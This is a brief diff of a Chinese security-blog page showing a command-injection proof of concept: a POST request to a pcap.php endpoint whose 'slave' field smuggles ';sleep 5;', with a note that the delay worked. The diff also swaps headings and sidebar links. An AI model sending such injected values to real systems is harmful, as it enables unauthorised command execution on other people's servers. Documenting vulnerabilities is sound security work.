@@ -39,7 +39,7 @@ if($_POST[slave_download] != '')
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")利用示例
 
-漏洞修复方案
+漏洞分析报告
 
 ```
 POST /en/9-13pcap.php HTTP/1.1
@@ -51,11 +51,11 @@ slave_download=1&slave=+;sleep 5;+#+
 
 深入探索
 
-数据管理
-
 编程
 
-客户关系管理
+安全工具下载
+
+Web安全课程
 
 执行 `sleep 5` 命令，成功延时 5 秒
 
